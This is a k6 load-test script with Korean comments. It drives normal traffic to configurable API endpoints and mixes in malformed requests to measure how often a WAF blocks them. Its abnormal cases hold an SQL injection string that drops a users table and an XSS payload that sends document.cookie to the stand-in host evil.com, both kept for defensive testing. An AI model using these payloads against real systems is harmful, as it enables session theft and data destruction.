/**
 * k6 Load Test Script — 패턴 선택 + 비정상 트래픽 혼합 + 다중 API 지원
 *
 * PATTERN 환경변수로 트래픽 패턴 선택:
 *   rampup (기본) : 점진 증가 → 유지 → 감소
 *   step          : 계단식 증가
 *   spike         : 기준 트래픽 → 급등 → 복귀
 *
 * 다중 API 지원 (최대 3개):
 *   URL  (또는 URL1) : 첫 번째 대상 URL (default: http://localhost:8080/v1/stress)
 *   URL2             : 두 번째 대상 URL (선택)
 *   URL3             : 세 번째 대상 URL (선택)
 *   → 설정된 URL들에 트래픽이 랜덤하게 균등 분배됨
 *
 * 비정상 트래픽:
 *   ABNORMAL_RATE : 전체 요청 중 비정상 요청 비율 (0~100, 기본 0)
 *
 *   비정상 유형 (랜덤 선택):
 *     1. 빈 바디                 → 403 기대
 *     2. 필수 필드 누락           → 403 기대
 *     3. 잘못된 JSON             → 403 기대
 *     4. SQL 인젝션 패턴         → 403 기대
 *     5. XSS 패턴               → 403 기대
 *     6. 초대용량 페이로드        → 403 기대
 *     7. 잘못된 Content-Type     → 403 기대
 *     8. 존재하지 않는 경로       → 404 기대
 *
 * 공통 변수:
 *   URL / URL1    - 첫 번째 대상 URL (default: http://localhost:8080/v1/stress)
 *   URL2          - 두 번째 대상 URL (선택)
 *   URL3          - 세 번째 대상 URL (선택)
 *   RATE          - 피크 req/s (default: 56)
 *   ABNORMAL_RATE - 비정상 요청 비율 % (default: 0)
 */

import http from 'k6/http';
import { check } from 'k6';
import { Trend, Rate, Counter } from 'k6/metrics';

// ── 메트릭 정의 ───────────────────────────────────────────────
const customLatency  = new Trend('stress_latency_ms', true);
const customSuccess  = new Rate('stress_success_rate');
const customTotal    = new Counter('stress_total_requests');
const abnormalTotal  = new Counter('stress_abnormal_requests');
const wafBlockRate   = new Rate('stress_waf_block_rate');

// ── 공통 변수 ─────────────────────────────────────────────────
const RATE          = parseInt(__ENV.RATE          || '56');
const PATTERN       = (__ENV.PATTERN     || 'rampup').toLowerCase();
const ABNORMAL_RATE = parseInt(__ENV.ABNORMAL_RATE || '0');

// ── 다중 URL 설정 (최대 3개) ───────────────────────────────────
const TARGET_URLS = [
  __ENV.URL || __ENV.URL1 || 'http://localhost:8080/v1/stress',
  __ENV.URL2 || '',
  __ENV.URL3 || '',
].filter(u => u !== '');

// 각 URL에서 베이스 URL 추출 (존재하지 않는 경로 테스트용)
const BASE_URLS = TARGET_URLS.map(u => u.replace(/\/v\d+\/.*$/, ''));

const INVALID_PATHS = ['/v1/none', '/v1/admin', '/v1/config', '/v1/unknown', '/v1/test'];

// ── 패턴별 stage 계산 ─────────────────────────────────────────
function buildStages() {
  if (PATTERN === 'step') {
    const steps        = parseInt(__ENV.STEPS        || '4');
    const stepDuration = __ENV.STEP_DURATION         || '1m';
    const sustain      = __ENV.SUSTAIN               || '2m';

    const stages = [];
    for (let i = 1; i <= steps; i++) {
      const stepRate = Math.round(RATE * i / steps);
      stages.push({ duration: '1s',         target: stepRate });
      stages.push({ duration: stepDuration, target: stepRate });
    }
    stages.push({ duration: '1s',    target: RATE });
    stages.push({ duration: sustain, target: RATE });
    return stages;
  }

  if (PATTERN === 'spike') {
    const baseline      = parseInt(__ENV.BASELINE      || '5');
    const warmup        = __ENV.WARMUP                 || '30s';
    const spikeDuration = __ENV.SPIKE_DURATION         || '3m';
    const cooldown      = __ENV.COOLDOWN               || '30s';

    return [
      { duration: warmup,        target: baseline },
      { duration: '5s',          target: RATE     },
      { duration: spikeDuration, target: RATE     },
      { duration: '5s',          target: baseline },
      { duration: cooldown,      target: baseline },
    ];
  }

  // rampup (기본값)
  const rampup   = __ENV.RAMPUP   || '2m';
  const sustain  = __ENV.SUSTAIN  || '3m';
  const rampdown = __ENV.RAMPDOWN || '1m';

  return [
    { duration: rampup,   target: RATE },
    { duration: sustain,  target: RATE },
    { duration: rampdown, target: 0    },
  ];
}

export const options = {
  scenarios: {
    stress_test: {
      executor:        'ramping-arrival-rate',
      startRate:       0,
      timeUnit:        '1s',
      preAllocatedVUs: 100,
      maxVUs:          500,
      stages:          buildStages(),
    },
  },

  thresholds: {
    http_req_duration:   ['p(90)<500', 'p(99)<1000'],
    http_req_failed:     ['rate<0.05'],
    stress_success_rate: ['rate>0.95'],
  },
};

// ── 유틸 함수 ─────────────────────────────────────────────────
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function generateRequestId() {
  return String(Math.floor(Math.random() * 1_000_000_000_000)).padStart(12, '0');
}

// ── 랜덤 URL 인덱스 선택 ──────────────────────────────────────
function pickUrlIndex() {
  return Math.floor(Math.random() * TARGET_URLS.length);
}

// ── 비정상 요청 유형명 ────────────────────────────────────────
const ABNORMAL_TYPE_NAMES = [
  '빈 바디',
  '필수 필드 누락 (requestid/uuid 없음)',
  '잘못된 JSON 형식',
  'SQL 인젝션 패턴',
  'XSS 패턴',
  '초대용량 페이로드 (10KB)',
  '잘못된 Content-Type (text/plain)',
  '존재하지 않는 경로',
];

// ── 비정상 요청 전송 ──────────────────────────────────────────
function sendAbnormalRequest() {
  const typeIdx = Math.floor(Math.random() * 8);
  const urlIdx  = pickUrlIndex();

  let url            = TARGET_URLS[urlIdx];
  let payload        = '';
  let expectedStatus = 403;
  const headers      = {
    'Content-Type': 'application/json',
    'User-Agent':   'k6-load-test/1.0',
  };

  switch (typeIdx) {
    case 0:
      // 빈 바디
      payload = '';
      break;

    case 1:
      // 필수 필드 누락 (requestid, uuid 없음)
      payload = JSON.stringify({ length: 256 });
      break;

    case 2:
      // 잘못된 JSON 형식
      payload = '{bad:json,missing:quotes}';
      break;

    case 3:
      // SQL 인젝션 패턴
      payload = JSON.stringify({
        requestid: "' OR '1'='1'; DROP TABLE users--",
        uuid:      "' UNION SELECT * FROM information_schema.tables--",
        length:    256,
      });
      break;

    case 4:
      // XSS 패턴
      payload = JSON.stringify({
        requestid: '<script>alert(document.cookie)</script>',
        uuid:      '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>',
        length:    256,
      });
      break;

    case 5:
      // 초대용량 페이로드 (10KB)
      payload = JSON.stringify({
        requestid: generateRequestId(),
        uuid:      generateUUID(),
        length:    256,
        padding:   'X'.repeat(10240),
      });
      break;

    case 6:
      // 잘못된 Content-Type
      headers['Content-Type'] = 'text/plain';
      payload = `requestid=${generateRequestId()}&uuid=${generateUUID()}`;
      break;

    case 7:
      // 존재하지 않는 경로 → 404 기대
      url = BASE_URLS[urlIdx] + INVALID_PATHS[Math.floor(Math.random() * INVALID_PATHS.length)];
      payload = JSON.stringify({
        requestid: generateRequestId(),
        uuid:      generateUUID(),
        length:    256,
      });
      expectedStatus = 404;
      break;
  }

  const res = http.post(url, payload, {
    headers,
    tags: { request_type: 'abnormal', target_url: url },
  });

  const blocked = res.status === expectedStatus;

  check(res, {
    [`비정상 차단 (${expectedStatus})`]: (r) => r.status === expectedStatus,
  });

  // 차단 실패 시 어떤 유형이 통과됐는지 로그 출력
  if (!blocked) {
    console.warn(
      `[차단 실패] 유형: ${ABNORMAL_TYPE_NAMES[typeIdx]}` +
      ` | 기대: ${expectedStatus}` +
      ` | 실제: ${res.status}` +
      ` | URL: ${url}`
    );
  }

  abnormalTotal.add(1);
  wafBlockRate.add(blocked);
}

// ── 정상 요청 전송 ────────────────────────────────────────────
function sendNormalRequest() {
  const url     = TARGET_URLS[pickUrlIndex()];
  const payload = JSON.stringify({
    requestid: generateRequestId(),
    uuid:      generateUUID(),
    length:    256,
  });

  const res = http.post(url, payload, {
    headers: {
      'Content-Type': 'application/json',
      'User-Agent':   'k6-load-test/1.0',
    },
    tags: { request_type: 'normal', target_url: url },
  });

  check(res, {
    'HTTP 200':        (r) => r.status === 200,
    'latency < 500ms': (r) => r.timings.duration < 500,
  });

  const httpOk = res.status >= 200 && res.status < 300;
  customLatency.add(res.timings.duration);
  customSuccess.add(httpOk);
  customTotal.add(1);
}

// ── 메인 VU 함수 ──────────────────────────────────────────────
export default function () {
  if (ABNORMAL_RATE > 0 && Math.random() * 100 < ABNORMAL_RATE) {
    sendAbnormalRequest();
  } else {
    sendNormalRequest();
  }
}

// ── 요약 출력 ─────────────────────────────────────────────────
export function handleSummary(data) {
  const dur      = data.metrics.http_req_duration;
  const reqs     = data.metrics.http_reqs;
  const fails    = data.metrics.http_req_failed;
  const abnormal = data.metrics.stress_abnormal_requests;
  const waf      = data.metrics.stress_waf_block_rate;

  const rps           = reqs     ? reqs.values.rate.toFixed(2)           : 'N/A';
  const p90           = dur      ? dur.values['p(90)'].toFixed(2)         : 'N/A';
  const p99           = dur      ? dur.values['p(99)'].toFixed(2)         : 'N/A';
  const failRate      = fails    ? (fails.values.rate * 100).toFixed(2)   : 'N/A';
  const abnormalCount = abnormal ? abnormal.values.count                  : 0;
  const wafRate       = waf      ? (waf.values.rate * 100).toFixed(2)     : 'N/A';

  // 다중 URL 정보 출력
  const urlSection = TARGET_URLS.length > 1
    ? `\n  대상 URL (${TARGET_URLS.length}개 균등 분배):\n` +
      TARGET_URLS.map((u, i) => `    URL${i + 1}: ${u}`).join('\n')
    : `\n  대상 URL  : ${TARGET_URLS[0]}`;

  const abnormalSection = ABNORMAL_RATE > 0 ? `
  ── 비정상 트래픽 ─────────────────────────────
  비정상 요청 수  : ${abnormalCount} 건
  WAF 차단 성공률 : ${wafRate} %` : '';

  console.log(`
══════════════════════════════════════════════
  k6 테스트 완료  [패턴: ${PATTERN.toUpperCase()}]
══════════════════════════════════════════════${urlSection}
  RPS (평균)  : ${rps} req/s
  P90 latency : ${p90} ms
  P99 latency : ${p99} ms
  Error rate  : ${failRate} %${abnormalSection}
══════════════════════════════════════════════`);

  return {};
}
